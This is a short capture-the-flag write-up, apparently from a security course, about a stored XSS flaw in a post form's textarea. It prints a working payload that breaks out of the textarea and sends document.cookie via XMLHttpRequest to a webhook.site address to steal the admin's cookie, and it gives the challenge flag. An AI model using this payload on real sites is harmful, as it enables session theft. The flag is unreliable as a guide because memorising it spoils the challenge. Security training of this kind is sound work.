# Challenge `Go on and censor my posts` writeup

- Vulnerability: XSS
- Where: In the post creation form's content field
- Impact: It allows the retrieval of a remote user's (in this case, the admin's) cookies

## Finding the vulnerability / Steps to reproduce

1. The post creation form contains both an `input` field (the title) and a `content` field. Attempting to add a regular XSS exploit payload has no effect (i.e., no information is leaked).
2. However, enclosing a payload with the `textarea` closure and opening tags allows the execution of an arbitrary script.
3. Just like in the previous challenges, a web server must be set up to intercept requests.
4. Using the previous script has a problem: it redirects the attacker to the web server's page (showing their own cookies) with no opportunity to confirm the post and send it to the admin for their cookies to be shown as well. An alternative involves using an XMLHttpRequest to send the request in the background (`</textarea><script>const xhr = new XMLHttpRequest(); xhr.open("POST", "https://webhook.site/6fe0e568-0fad-4d39-b043-2510c31a899c", false);xhr.send(document.cookie)</script><textarea>`), which, once submitted for approval, leads to the retrieval of the admin's cookie/flag (`SSof{I_do_not_get_this__Too_many_weird_characters__Automatic_reject}`).